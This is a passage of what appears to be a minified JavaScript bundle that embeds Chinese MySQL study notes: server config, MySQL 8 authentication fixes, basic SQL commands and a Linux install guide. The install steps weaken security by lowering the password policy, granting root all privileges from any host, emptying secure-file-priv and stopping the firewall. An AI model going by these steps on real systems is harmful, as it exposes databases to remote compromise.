[client]\n#password=your_password\nport=3306\nsocket=/tmp/mysql.sock\n\n[mysqld]\nport=3306\nsocket=/tmp/mysql.sock\nkey_buffer_size=256M\nmax_allowed_packet=512M\ntable_open_cache=256\nsort_buffer_size=1M\nread_buffer_size=1M\nread_rnd_buffer_size=4M\nmyisam_sort_buffer_size=64M\nthread_cache_size=8\n\nsecure-file-priv=""\nexplicit_defaults_for_timestamp=1\ndatadir= "C:/laragon/data/mysql"\n\n\n[mysqldump]\nquick\nmax_allowed_packet=512M\n\n      ')])])}],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"22c8ad70",null),d=m.exports,g=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},b=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("         mysql 安装了最新版本8.x版本后的报错： the server requested authentication method unknown to the client\n2018年07月22日 13:11:38 youcijibi 阅读数 10613\n一，在MySQL 8.0.11中，caching_sha2_password是默认的身份验证插件，而不是以往的mysql_native_password。有关此更改对服务器操作的影响以及服务器与客户端和连接器的兼容性的信息，请参阅caching_sha2_password作为首选的身份验证插件。(翻译自https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html）\n今天在新服务上配置安装mysql8.0.11时，像往常一样设置mysql密码，设置成功后在shell下输入mysql -u root -p，再输入密码能正常进入，但在phpmyadmin或直接用http://php.net/manual/zh/mysqli.real-connect.php上的连接，均提示无法连接，具体报错信息为\nmysqli_real_connect(): The server requested authentication method unknown to the client [sha256_password]  \n \n搜了一圈，找到官方文档才发现从8.0.11版本起，不再像mysql5.7及以前版本那样，设置用户密码时默认的验证方式为caching_sha2_password，如果发现升级mysql8.0.11后原有的程序不能连接mysql，可迅速在mysql command line client客户端用下面的命令设置成mysql5.7及以前版本的密码验证方式，同时MYSQL8.0.11下修改密码的方式与原先也不大一样，原先的部分修改密码的命令在mysql8.0.11下不能使用。\n> use mysql  \n> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '你的密码';  \n> FLUSH PRIVILEGES;            \n二，\n \nmysql 安装了最新版本8.0.11后创建用户并授权后，授权的用户连接数据库提示\nThe server requested authentication method unknown to the client\n查阅一些相关的资料后发现是由于新版本的mysql账号密码解锁机制不一致导致的\n解决办法：\n删除创建的用户和授权，\n找到mysql配置文件并加入\ndefault_authentication_plugin=mysql_native_password\n变为原来的验证方式，然后从新创建用户并授权即可\n或\nmysql -uroot -p\n \nuse mysql;\nALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '你的密码';\n三\nThe caching_sha2_password and sha256_password authentication plugins provide more secure \npassword encryption than the mysql_native_password plugin, and caching_sha2_password provides better performance than sha256_password. \nDue to these superior security and performance characteristics of caching_sha2_password, it is as of MySQL 8.0 the preferred authentication plugin,\n and is also the default authentication plugin rather than mysql_native_password.\n翻译：caching_sha2_password和sha256_password认证插件比mysql_native_password插件提供的密码加密更加安全，并且caching_sha2_password加密比sha256_password的加密性能更好。\n由于caching_sha2_password这样优秀的安全和性能特性，让他作为MySQL8.0的首选认证插件，这也是默认的认证插件插件而不是mysql_native_password。\n具体你可以访问这个caching_sha2_password Compatibility Issues and Solutions来了解，已经使用了新的加密方式，访问不了的解决方法，简单总结一下就是\n1、将加密方式改为旧的，在配置文件my.conf中添加如下：\n[mysqld]\ndefault_authentication_plugin=mysql_native_password\n2、使用支持新的加密方式的客户端（Client），比如等于或高于8.0.4版本的libmysqlclient\n3、使用支持新的加密方式的连接驱动（Connector）：\nMySQL Connector/C++ 1.1.11 or higher or 8.0.7 or higher.\n \nMySQL Connector/J 8.0.9 or higher.\n \nMySQL Connector/NET 8.0.10 or higher (through the classic MySQL protocol).\n \nMySQL Connector/Node.js 8.0.9 or higher.\n \nPHP: the X DevAPI PHP extension (mysql_xdevapi) supports caching_sha2_password.\n4、使用了新的加密方式，改为旧的加密方式，而root用户也要进行相应的更改才可以，因为root用户还是新的加方式，所以使用alter语句改为重置密码来覆盖新的加密方式的密码：\nALTER USER 'root'@'localhost'\n  IDENTIFIED WITH mysql_native_password\n  BY 'password';\npassword是你将要设置的root用户的密码。\n参考文章：Changes Affecting Upgrades to MySQL 8.0\n     ")])])}],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"1b167366",null),y=S.exports,f=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},_=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h4",[n._v("mysql 简单命令")]),t("pre",[n._v("         CREATE TABLE `o2o`.`Untitled`  (\n  `area_id` int(2) NOT NULL AUTO_INCREMENT,\n  `area_name` varchar(255) NOT NULL,\n  `priority` int(2) NOT NULL DEFAULT 0,\n  `create_time` datetime(0) NULL DEFAULT NULL,\n  `last_edit_time` datetime(0) NULL DEFAULT NULL,\n  PRIMARY KEY (`area_id`),\n\tunique key `UK_AREA`(`area_name`)\n)engine=INNODB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8 ;\n\n     ")]),t("pre",[n._v("         加入服务\n加入 环境变量\n管理员启动 CMD\nmysql -u root -p  输入密码\n命令行要带 ； \nddl\ndml\ndql\ndcl\n\n\ncreate database web01; 创建\ncreate database web01 default character set utf8;\nshow create database web01; 查看结构\nuse web01;  database changed;  使用表\nselect database(); 查看当前正在操作的库 \n\ncreat table user(\nuid int(32) primary key auto_increment,\nuname varchar(32),\nupassword varchar(32)\n);\nshow tables; 展示所有表\ndesc user; 显示user表的详细信息\ndrop table user; 删除表\n改变my.ini 文件重启 mysql 服务 ，防止乱码，设置字符集utf8\nset uname gbk;  在 cmd 中 改变单列数据编码，防止中文乱码，只在CMD显示上有效\nalter table user add uage int(32) not null; 添加一列\nalter table user modify uage varchar(100) null; 改变列属性\nalter table user uage uinfo varchar(100) null; 改变列名\nalter table user drop uinfo; 删除列\n\ninsert into user(uid,uname,upasswod) values(null,'name1','pass1');\ninsert into user values(null,'q','w'); 全字段插入\nupdate user set uname='po', upassword='p1' where uid=5; 更新表数值\ndelete from user where uid=2;\ntruncate table user; 摧毁表并重建一张一样字段的表 ，不可回滚，本质上是两张表\nstart trancation;开启事务\nrollback;  回滚 \n\nselect [distinct] * | 列名... from  表 [where 条件]。\n select *  from user as p; 表别名查询\nselect pname as pn from product ;列别名查询\nselect distinct pq from product; 去掉重复值查询\nselect pname,pr+12 from product; 带运算查询\nselect * from pr where pid>45; 条件查询\nselect * from  pro  where pname like '_新%'； 格式 占位符查询 第二个字是新\nselect * from  pro where pid in (4,8,9,52,44,63);  in  范围查询\nselect * from pro where pr is null ; 根据空值查询 \n and or  not 逻辑查询  where not (pr>100);\n 排序\nselect * from pro where pname like '_新%' order by price desc; 排序\n聚合 sum() avg() count(*) max() min()\nselect sum(price) from pro; 聚合\n分组\nselect cid ,count(*) from product group by cid;\nselect cid ,avg(price) from product group by having avg(price)>60\n根据cid分组，分组统计每组商品的平均价格，并且平均价格大于60；\n\n\n\n\n\n\n\n\n\n\n\n\n     ")])])}],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"66fdad40",null),T=E.exports,k=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},C=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",[n._v("LINUX 安装 5.7 mysql ")]),t("pre",[n._v("1. 通过secureCRT工具连接Linux系统\n\n2. 上传 mysql 的安装包\n\n    alt + p -------\x3e put d:/setup/mysql-5.7.27-1.el7.x86_64.rpm-bundle.tar\n\n3. 解压 mysql 的安装包\n\n\tmkdir mysql\n    \n\ttar -xvf mysql-5.7.27-1.el7.x86_64.rpm-bundle.tar -C mysql/\n\n\n4. 安装客户端\n    \n\tcd mysql/\n    \n\trpm -ivh mysql-community-client-5.7.27-1.el7.x86_64.rpm --force --nodeps\n\n\n5. 安装服务端\n    \n\trpm -ivh mysql-community-server-5.7.27-1.el7.x86_64.rpm --force --nodeps\n\n\n6. 修改mysql默认字符集\n    \n\tvi /etc/my.cnf\n    \n\t添加如下内容：\n    \n\t[mysqld]\n\tcharacter-set-server=utf8\n\tcollation-server=utf8_general_ci\n \n\t-- 在文件最下方添加\n    \n\t[client]\n\tdefault-character-set=utf8\n\n7. 启动mysql服务\n    \n\tservice mysqld start\n\n8. 登录mysql\n    \n\tmysql -u root -p  敲回车，输入密码\n    \n\t初始密码查看：cat /var/log/mysqld.log\n    \n\t在root@localhost:   后面的就是初始密码\n\n9. 修改mysql登录密码\n    \n\tset global validate_password_policy=0;\n    \n\tset global validate_password_length=1;\n    \n\tset password=password('密码');\n\n\n10. 授予远程连接权限\n    \n\t//授权\n\tgrant all privileges on *.* to 'root' @'%' identified by '密码';\n    \n\t//刷新\n\tflush privileges;\n\n\n11. 关闭Linux系统防火墙\n\tsystemctl stop firewalld\n\n12. 重启mysql服务\n\tservice mysqld restart\n\n13. 使用SQLYog工具连接mysql          \n      ")])])}],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"75b65d6e",null),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},A=[],I="\x3c!--\r\n * @Date           : 2021-04-10 16:40:09\r\n * @FilePath       : /jinnian-space/src/pages/sql/md/MySQL基础-01-授课笔记.md\r\n * @Description    : \r\n--\x3e\r\n# MySQL基础-01-授课笔记\r\n\r\n### 一、数据库的基本概念\r\n\r\n#### 1.为什么要学数据库？\r\n\r\n- 之前我们如果想将一些数据实现永久化存储，可以怎么做呢？没错。使用IO流的技术将数据保存到本地文件中\r\n- 但是接下来我有这样一个需求：将下面的user.txt文件中的王五年龄修改为35\r\n\r\n```txt\r\n张三 23 男\r\n李四 24 男\r\n王五 25 女\r\n赵六 26 女\r\n周七 27 男\r\n```\r\n\r\n- 我们要如何实现呢？\r\n  - 可以采用字符缓冲流，将每一行数据读取出来，封装为User对象。将多个User对象保存到集合中\r\n  - 然后遍历集合，将王五对象的年龄修改为35,再重新将集合中的对象信息写回到文件中\r\n- 这一套操作太麻烦了，而现在我们有一种更加方便的方式来完成这个需求了，这种方式就是数据库！\r\n\r\n#### 2.什么是数据库？\r\n\r\n- 用于存储和管理数据的仓库\r\n- 英文单词为：DataBase，简称DB\r\n\r\n#### 3.数据库的好处？\r\n\r\n- 可以持久化存储数据\r\n- 方便存储和管理数据\r\n- 使用了统一的方式操作数据库 -- SQL\r\n\r\n#### 4.常见的数据库有哪些？\r\n\r\n\r\n\x3c!-- ![01](./img/sql/mysql/MySQL基础-01-授课笔记.assets/01.png) --\x3e\r\n\x3c!-- src\\pages\\sql\\md\\MySQL基础-01-授课笔记.md --\x3e\r\n![01](./img/sql/mysql/MySQL基础-01-授课笔记.assets/01.png)\r\n\r\n### 二、MySQL数据库的介绍和安装\r\n\r\n#### 1.MySQL数据库介绍\r\n\r\n- 小型的数据库\r\n- 开源免费(6版本之前免费)\r\n- 所属于Oracle公司\r\n\r\n#### 2.MySQL数据库安装\r\n\r\n1. 通过secureCRT工具连接Linux系统\r\n\r\n2. 上传 mysql 的安装包\r\n\r\n```linux\r\nalt + p -------\x3e put d:/setup/mysql-5.7.27-1.el7.x86_64.rpm-bundle.tar\r\n```\r\n\r\n3. 解压 mysql 的安装包\r\n\r\n```linux\r\nmkdir mysql\r\ntar -xvf mysql-5.7.27-1.el7.x86_64.rpm-bundle.tar -C mysql/\r\n```\r\n\r\n4. 安装客户端\r\n\r\n```linux\r\ncd mysql/\r\nrpm -ivh mysql-community-client-5.7.27-1.el7.x86_64.rpm --force --nodeps\r\n```\r\n\r\n5. 安装服务端\r\n\r\n```\r\nrpm -ivh mysql-community-server-5.7.27-1.el7.x86_64.rpm --force --nodeps\r\n```\r\n\r\n6. 修改mysql默认字符集\r\n\r\n```\r\nvi /etc/my.cnf\r\n\r\n添加如下内容：\r\n[mysqld]\r\ncharacter-set-server=utf8\r\ncollation-server=utf8_general_ci\r\n\r\n-- 需要在最下方填写\r\n[client]\r\ndefault-character-set=utf8\r\n```\r\n\r\n7. 启动mysql服务\r\n\r\n```\r\nservice mysqld start\r\n```\r\n\r\n8. 登录mysql\r\n\r\n```\r\nmysql -u root -p  敲回车，输入密码\r\n初始密码查看：cat /var/log/mysqld.log\r\n在root@localhost:   后面的就是初始密码\r\n```\r\n\r\n9. 修改mysql登录密码\r\n\r\n```\r\nset global validate_password_policy=0;\r\n\r\nset global validate_password_length=1;\r\n\r\nset password=password('密码');\r\n```\r\n\r\n10. 授予远程连接权限\r\n\r\n```\r\n//授权\r\ngrant all privileges on *.* to 'root' @'%' identified by '密码';\r\n//刷新\r\nflush privileges;\r\n```\r\n\r\n11. 关闭Linux系统防火墙\r\n\r\n```\r\nsystemctl stop firewalld.service\r\n```\r\n\r\n#### 3.MySQL数据库登录\r\n\r\n- sqlyog工具登录mysql\r\n\r\n![02](./img/sql/mysql/MySQL基础-01-授课笔记.assets/02.png)\r\n\r\n### 三、SQL语句\r\n\r\n#### 1.数据库、数据表、数据的关系介绍\r\n\r\n- 数据库\r\n  - 用于存储和管理数据的仓库\r\n  - 一个库中可以包含多个数据表\r\n- 数据表\r\n  - 数据库最重要的组成部分之一\r\n  - 它由纵向的列和横向的行组成(类似excel表格)\r\n  - 可以指定列名、数据类型、约束等\r\n  - 一个表中可以存储多条数据\r\n- 数据\r\n  - 想要永久化存储的数据\r\n\r\n![03](./img/sql/mysql/MySQL基础-01-授课笔记.assets/03.png)\r\n\r\n#### 2.SQL介绍\r\n\r\n- 什么是SQL\r\n\r\n  - Structured Query Language：结构化查询语言\r\n  - 其实就是定义了操作所有关系型数据库的规则。每一种数据库操作的方式可能会存在一些不一样的地方，我们称为“方言”。\r\n\r\n- SQL通用语法\r\n\r\n  - SQL 语句可以单行或多行书写，以分号结尾。\r\n  - 可使用空格和缩进来增强语句的可读性。\r\n  - MySQL 数据库的 SQL 语句不区分大小写，关键字建议使用大写。\r\n  - 数据库的注释：\r\n    - 单行注释：-- 注释内容       #注释内容(mysql特有)\r\n    - 多行注释：/* 注释内容 */\r\n\r\n- SQL分类\r\n\r\n  - DDL(Data Definition Language)数据定义语言\r\n    - 用来定义数据库对象：数据库，表，列等。关键字：create, drop,alter 等\r\n  - DML(Data Manipulation Language)数据操作语言\r\n    - 用来对数据库中表的数据进行增删改。关键字：insert, delete, update 等\r\n  - DQL(Data Query Language)数据查询语言\r\n    - 用来查询数据库中表的记录(数据)。关键字：select, where 等\r\n  - DCL(Data Control Language)数据控制语言(了解)\r\n    - 用来定义数据库的访问权限和安全级别，及创建用户。关键字：GRANT， REVOKE 等\r\n\r\n  ![04](./img/sql/mysql/MySQL基础-01-授课笔记.assets/04.png)\r\n\r\n#### 3.DDL-操作数据库\r\n\r\n- R(Retrieve)：查询\r\n\r\n  - 查询所有数据库\r\n\r\n  ```mysql\r\n  -- 查询所有数据库\r\n  SHOW DATABASES;\r\n  ```\r\n\r\n  - 查询某个数据库的创建语句\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SHOW CREATE DATABASE 数据库名称;\r\n  \r\n  -- 查看mysql数据库的创建格式\r\n  SHOW CREATE DATABASE mysql;\r\n  ```\r\n\r\n- C(Create)：创建\r\n\r\n  - 创建数据库\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  CREATE DATABASE 数据库名称;\r\n  \r\n  -- 创建db1数据库\r\n  CREATE DATABASE db1;\r\n  \r\n  -- 创建一个已存在的数据库会报错\r\n  -- 错误代码：1007  Can't create database 'db1'; database exists\r\n  CREATE DATABASE db1;\r\n  ```\r\n\r\n  - 创建数据库(判断，如果不存在则创建)\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  CREATE DATABASE IF NOT EXISTS 数据库名称;\r\n  \r\n  -- 创建数据库db2(判断，如果不存在则创建)\r\n  CREATE DATABASE IF NOT EXISTS db2;\r\n  ```\r\n\r\n  - 创建数据库、并指定字符集\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  CREATE DATABASE 数据库名称 CHARACTER SET 字符集名称;\r\n  \r\n  -- 创建数据库db3、并指定字符集utf8\r\n  CREATE DATABASE db3 CHARACTER SET utf8;\r\n  \r\n  -- 查看db3数据库的字符集\r\n  SHOW CREATE DATABASE db3;\r\n  ```\r\n\r\n  - 练习：创建db4数据库、如果不存在则创建，指定字符集为gbk\r\n\r\n  ```mysql\r\n  -- 创建db4数据库、如果不存在则创建，指定字符集为gbk\r\n  CREATE DATABASE IF NOT EXISTS db4 CHARACTER SET gbk;\r\n  \r\n  -- 查看db4数据库的字符集\r\n  SHOW CREATE DATABASE db4;\r\n  ```\r\n\r\n- U(Update)：修改\r\n\r\n  - 修改数据库的字符集\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  ALTER DATABASE 数据库名称 CHARACTER SET 字符集名称;\r\n  \r\n  -- 修改数据库db4的字符集为utf8\r\n  ALTER DATABASE db4 CHARACTER SET utf8;\r\n  \r\n  -- 查看db4数据库的字符集\r\n  SHOW CREATE DATABASE db4;\r\n  ```\r\n\r\n- D(Delete)：删除\r\n\r\n  - 删除数据库\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  DROP DATABASE 数据库名称;\r\n  \r\n  -- 删除db1数据库\r\n  DROP DATABASE db1;\r\n  \r\n  -- 删除一个不存在的数据库会报错\r\n  -- 错误代码：1008  Can't drop database 'db1'; database doesn't exist\r\n  DROP DATABASE db1;\r\n  ```\r\n\r\n  - 删除数据库(判断，如果存在则删除)\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  DROP DATABASE IF EXISTS 数据库名称;\r\n  \r\n  -- 删除数据库db2，如果存在\r\n  DROP DATABASE IF EXISTS db2;\r\n  ```\r\n\r\n- 使用数据库\r\n\r\n  - 查询当前正在使用的数据库名称\r\n\r\n  ```mysql\r\n  -- 查询当前正在使用的数据库\r\n  SELECT DATABASE();\r\n  ```\r\n\r\n  - 使用数据库\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  USE 数据库名称；\r\n  \r\n  -- 使用db4数据库\r\n  USE db4;\r\n  ```\r\n\r\n#### 4.DDL-操作数据表\r\n\r\n- R(Retrieve)：查询\r\n\r\n  - 查询数据库中所有的数据表\r\n\r\n  ```mysql\r\n  -- 使用mysql数据库\r\n  USE mysql;\r\n  \r\n  -- 查询库中所有的表\r\n  SHOW TABLES;\r\n  ```\r\n\r\n  - 查询表结构\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  DESC 表名;\r\n  \r\n  -- 查询user表结构\r\n  DESC user;\r\n  ```\r\n\r\n  - 查询表字符集\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SHOW TABLE STATUS FROM 库名 LIKE '表名';\r\n  \r\n  -- 查看mysql数据库中user表字符集\r\n  SHOW TABLE STATUS FROM mysql LIKE 'user';\r\n  ```\r\n\r\n- C(Create)：创建\r\n\r\n  - 创建数据表\r\n\r\n    - 标准语法\r\n\r\n    ```mysql\r\n    CREATE TABLE 表名(\r\n        列名1 数据类型1,\r\n        列名2 数据类型2,\r\n        ....\r\n        列名n 数据类型n\r\n    );\r\n    -- 注意：最后一列，不需要加逗号\r\n    ```\r\n\r\n    - 数据类型\r\n\r\n    ```mysql\r\n    1. int：整数类型\r\n    \t* age int\r\n    2. double:小数类型\r\n    \t* score double(5,2)\r\n    \t* price double\r\n    3. date:日期，只包含年月日     yyyy-MM-dd\r\n    4. datetime:日期，包含年月日时分秒\t yyyy-MM-dd HH:mm:ss\r\n    5. timestamp:时间戳类型\t包含年月日时分秒\t yyyy-MM-dd HH:mm:ss\t\r\n    \t* 如果将来不给这个字段赋值，或赋值为null，则默认使用当前的系统时间，来自动赋值\r\n    6. varchar：字符串\r\n    \t* name varchar(20):姓名最大20个字符\r\n    \t* zhangsan 8个字符  张三 2个字符\r\n    ```\r\n\r\n    - 创建数据表\r\n\r\n    ```mysql\r\n    -- 使用db3数据库\r\n    USE db3;\r\n    \r\n    -- 创建一个product商品表\r\n    CREATE TABLE product(\r\n    \tid INT,\t\t\t\t-- 商品编号\r\n    \tNAME VARCHAR(30),\t-- 商品名称\r\n    \tprice DOUBLE,\t\t-- 商品价格\r\n    \tstock INT,\t\t\t-- 商品库存\r\n    \tinsert_time DATE    -- 上架时间\r\n    );\r\n    ```\r\n\r\n    - 复制表\r\n\r\n    ```mysql\r\n    -- 标准语法\r\n    CREATE TABLE 表名 LIKE 被复制的表名;\r\n    \r\n    -- 复制product表到product2表\r\n    CREATE TABLE product2 LIKE product;\r\n    ```\r\n\r\n- U(Update)：修改\r\n\r\n  - 修改表名\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  ALTER TABLE 表名 RENAME TO 新的表名;\r\n  \r\n  -- 修改product2表名为product3\r\n  ALTER TABLE product2 RENAME TO product3;\r\n  ```\r\n\r\n  - 修改表的字符集\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  ALTER TABLE 表名 CHARACTER SET 字符集名称;\r\n  \r\n  -- 查看db3数据库中product3数据表字符集\r\n  SHOW TABLE STATUS FROM db3 LIKE 'product3';\r\n  -- 修改product3数据表字符集为gbk\r\n  ALTER TABLE product3 CHARACTER SET gbk;\r\n  -- 查看db3数据库中product3数据表字符集\r\n  SHOW TABLE STATUS FROM db3 LIKE 'product3';\r\n  ```\r\n\r\n  - 添加一列\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  ALTER TABLE 表名 ADD 列名 数据类型;\r\n  \r\n  -- 给product3表添加一列color\r\n  ALTER TABLE product3 ADD color VARCHAR(10);\r\n  ```\r\n\r\n  - 修改列名称和数据类型\r\n\r\n  ```mysql\r\n  -- 修改数据类型 标准语法\r\n  ALTER TABLE 表名 MODIFY 列名 新数据类型;\r\n  \r\n  -- 将color数据类型修改为int\r\n  ALTER TABLE product3 MODIFY color INT;\r\n  -- 查看product3表详细信息\r\n  DESC product3;\r\n  \r\n  \r\n  -- 修改列名和数据类型 标准语法\r\n  ALTER TABLE 表名 CHANGE 列名 新列名 新数据类型;\r\n  \r\n  -- 将color修改为address,数据类型为varchar\r\n  ALTER TABLE product3 CHANGE color address VARCHAR(30);\r\n  -- 查看product3表详细信息\r\n  DESC product3;\r\n  ```\r\n\r\n  - 删除列\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  ALTER TABLE 表名 DROP 列名;\r\n  \r\n  -- 删除address列\r\n  ALTER TABLE product3 DROP address;\r\n  ```\r\n\r\n- D(Delete)：删除\r\n\r\n  - 删除数据表\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  DROP TABLE 表名;\r\n  \r\n  -- 删除product3表\r\n  DROP TABLE product3;\r\n  \r\n  -- 删除不存在的表，会报错\r\n  -- 错误代码：1051  Unknown table 'product3'\r\n  DROP TABLE product3;\r\n  ```\r\n\r\n  - 删除数据表(判断，如果存在则删除)\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  DROP TABLE IF EXISTS 表名;\r\n  \r\n  -- 删除product3表，如果存在则删除\r\n  DROP TABLE IF EXISTS product3;\r\n  ```\r\n\r\n#### 5.DML-INSERT语句\r\n\r\n- 新增表数据语法\r\n\r\n  - 新增格式1：给指定列添加数据\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  INSERT INTO 表名(列名1,列名2,...) VALUES (值1,值2,...);\r\n  \r\n  -- 向product表添加一条数据\r\n  INSERT INTO product(id,NAME,price,stock,insert_time) VALUES (1,'手机',1999,22,'2099-09-09');\r\n  \r\n  -- 向product表添加指定列数据\r\n  INSERT INTO product (id,NAME,price) VALUES (2,'电脑',4999);\r\n  \r\n  -- 查看表中所有数据\r\n  SELECT * FROM product;\r\n  ```\r\n\r\n  - 新增格式2：默认给全部列添加数据\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  INSERT INTO 表名 VALUES (值1,值2,值3,...);\r\n  \r\n  -- 默认给全部列添加数据\r\n  INSERT INTO product VALUES (3,'电视',2999,18,'2099-06-06');\r\n  \r\n  -- 查看表中所有数据\r\n  SELECT * FROM product;\r\n  ```\r\n\r\n  - 新增格式3：批量添加数据\r\n\r\n  ```mysql\r\n  -- 默认添加所有列数据 标准语法\r\n  INSERT INTO 表名 VALUES (值1,值2,值3,...),(值1,值2,值3,...),(值1,值2,值3,...);\r\n  \r\n  -- 批量添加数据\r\n  INSERT INTO product VALUES (4,'冰箱',999,26,'2099-08-08'),(5,'洗衣机',1999,32,'2099-05-10');\r\n  -- 查看表中所有数据\r\n  SELECT * FROM product;\r\n  \r\n  \r\n  -- 给指定列添加数据 标准语法\r\n  INSERT INTO 表名(列名1,列名2,...) VALUES (值1,值2,...),(值1,值2,...),(值1,值2,...);\r\n  \r\n  -- 批量添加指定列数据\r\n  INSERT INTO product (id,NAME,price) VALUES (6,'微波炉',499),(7,'电磁炉',899);\r\n  -- 查看表中所有数据\r\n  SELECT * FROM product;\r\n  ```\r\n\r\n- 注意事项\r\n\r\n  - 列名和值的数量以及数据类型要对应\r\n  - 除了数字类型，其他数据类型的数据都需要加引号(单引双引都可以，推荐单引)\r\n\r\n#### 6.DML-UPDATE语句\r\n\r\n- 修改表数据语法\r\n\r\n```mysql\r\n-- 标准语法\r\nUPDATE 表名 SET 列名1 = 值1,列名2 = 值2,... [where 条件];\r\n\r\n-- 修改手机的价格为3500\r\nUPDATE product SET price=3500 WHERE NAME='手机';\r\n\r\n-- 查看所有数据\r\nSELECT * FROM product;\r\n\r\n-- 修改电视的价格为1800、库存为36\r\nUPDATE product SET price=1800,stock=36 WHERE NAME='电视';\r\n\r\n-- 修改电磁炉的库存为10\r\nUPDATE product SET stock=10 WHERE id=7;\r\n```\r\n\r\n- 注意事项\r\n  - 修改语句中必须加条件\r\n  - 如果不加条件，则将所有数据都修改\r\n\r\n#### 7.DML-DELETE语句\r\n\r\n- 删除表数据语法\r\n\r\n```mysql\r\n-- 标准语法\r\nDELETE FROM 表名 [WHERE 条件];\r\n\r\n-- 删除product表中的微波炉信息\r\nDELETE FROM product WHERE NAME='微波炉';\r\n\r\n-- 删除product表中库存为10的商品信息\r\nDELETE FROM product WHERE stock=10;\r\n\r\n-- 查看所有商品信息\r\nSELECT * FROM product;\r\n```\r\n\r\n- 注意事项\r\n  - 删除语句中必须加条件\r\n  - 如果不加条件，则将所有数据删除\r\n\r\n#### 8.DQL-单表查询\r\n\r\n- 数据准备(直接复制执行即可)\r\n\r\n```mysql\r\n-- 创建db1数据库\r\nCREATE DATABASE db1;\r\n\r\n-- 使用db1数据库\r\nUSE db1;\r\n\r\n-- 创建数据表\r\nCREATE TABLE product(\r\n\tid INT,\t\t\t\t-- 商品编号\r\n\tNAME VARCHAR(20),\t-- 商品名称\r\n\tprice DOUBLE,\t\t-- 商品价格\r\n\tbrand VARCHAR(10),\t-- 商品品牌\r\n\tstock INT,\t\t\t-- 商品库存\r\n\tinsert_time DATE    -- 添加时间\r\n);\r\n\r\n-- 添加数据\r\nINSERT INTO product VALUES (1,'华为手机',3999,'华为',23,'2088-03-10'),\r\n(2,'小米手机',2999,'小米',30,'2088-05-15'),\r\n(3,'苹果手机',5999,'苹果',18,'2088-08-20'),\r\n(4,'华为电脑',6999,'华为',14,'2088-06-16'),\r\n(5,'小米电脑',4999,'小米',26,'2088-07-08'),\r\n(6,'苹果电脑',8999,'苹果',15,'2088-10-25'),\r\n(7,'联想电脑',7999,'联想',NULL,'2088-11-11');\r\n```\r\n\r\n- 查询语法\r\n\r\n```mysql\r\nselect\r\n\t字段列表\r\nfrom\r\n\t表名列表\r\nwhere\r\n\t条件列表\r\ngroup by\r\n\t分组字段\r\nhaving\r\n\t分组之后的条件\r\norder by\r\n\t排序\r\nlimit\r\n\t分页限定\r\n```\r\n\r\n- 查询全部\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT * FROM 表名;\r\n\r\n-- 查询product表所有数据\r\nSELECT * FROM product;\r\n```\r\n\r\n- 查询部分\r\n\r\n  - 多个字段查询\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 列名1,列名2,... FROM 表名;\r\n  \r\n  -- 查询名称、价格、品牌\r\n  SELECT NAME,price,brand FROM product;\r\n  ```\r\n\r\n  - 去除重复查询\r\n    - 注意：只有全部重复的才可以去除\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT DISTINCT 列名1,列名2,... FROM 表名;\r\n  \r\n  -- 查询品牌\r\n  SELECT brand FROM product;\r\n  -- 查询品牌，去除重复\r\n  SELECT DISTINCT brand FROM product;\r\n  ```\r\n\r\n  - 计算列的值(四则运算)\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 列名1 运算符(+ - * /) 列名2 FROM 表名;\r\n  \r\n  /*\r\n  \t计算列的值\r\n  \t标准语法：\r\n  \t\tSELECT 列名1 运算符(+ - * /) 列名2 FROM 表名;\r\n  \t\t\r\n  \t如果某一列为null，可以进行替换\r\n  \tifnull(表达式1,表达式2)\r\n  \t表达式1：想替换的列\r\n  \t表达式2：想替换的值\r\n  */\r\n  -- 查询商品名称和库存，库存数量在原有基础上加10\r\n  SELECT NAME,stock+10 FROM product;\r\n  \r\n  -- 查询商品名称和库存，库存数量在原有基础上加10。进行null值判断\r\n  SELECT NAME,IFNULL(stock,0)+10 FROM product;\r\n  ```\r\n\r\n  - 起别名\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 列名1,列名2,... AS 别名 FROM 表名;\r\n  \r\n  -- 查询商品名称和库存，库存数量在原有基础上加10。进行null值判断。起别名为getSum\r\n  SELECT NAME,IFNULL(stock,0)+10 AS getsum FROM product;\r\n  SELECT NAME,IFNULL(stock,0)+10 getsum FROM product;\r\n  ```\r\n\r\n- 条件查询\r\n\r\n  - 条件分类\r\n\r\n  | 符号                | 功能                                   |\r\n  | ------------------- | -------------------------------------- |\r\n  | >                   | 大于                                 